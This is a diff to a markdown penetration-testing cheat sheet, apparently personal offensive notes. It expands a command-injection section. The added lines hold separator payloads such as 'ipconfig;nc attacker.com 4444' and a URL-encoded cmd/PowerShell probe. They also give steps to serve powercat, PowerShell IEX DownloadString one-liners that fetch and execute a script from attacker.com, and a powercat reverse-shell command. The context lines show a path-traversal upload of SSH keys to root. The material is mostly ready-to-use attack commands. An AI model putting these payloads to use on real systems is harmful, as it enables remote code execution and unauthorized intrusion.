@@ -154,10 +154,44 @@ curl -i -F 'myFile=@./authorized_keys;filename=../../../../../../../../../../roo
 ssh -i new-key root@target.com
 ```
 
-## Command Inject
+## Command Injection
+
+* Shell command seperator %3B = ';'
+* e.g. ipconfig;nc attacker.com 4444
+* e.g. ";ls #
 
 Test if we run on 'cmd' or 'powershell'
 
 ```shell
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
+# URL encode with BURP
+%3B%28%64%69%72%20%32%3e%26%31%20%2a%60%7c%65%63%68%6f%20%43%4d%44%29%3b%26%3c%23%20%72%65%6d%20%23%3e%65%63%68%6f%20%50%6f%77%65%72%53%68%65%6c%6c%20
+```
+
+Serve Powercat
+
+* NC tool for pwsh `https://github.com/besimorhino/powercat`
+* -c IP to connect
+* -p Port to connect
+* -e executeable to run
+* -ep execute Powershell
+
+```bash
+# serve via local machine
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+nc -nlvp 4444
+```
+
+Download Powercat and spawn Reverse Shell
+
+```powershell
+# download from github 
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+# download from attacker machine
+IEX (New-Object System.Net.Webclient).DownloadString("http://attacker.com/powercat.ps1")
+# run PS reverse shell 
+powercat -c attacker.com -p 4444 -ep
+# another PS version 1.0 reverse shell
+https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1
 ```
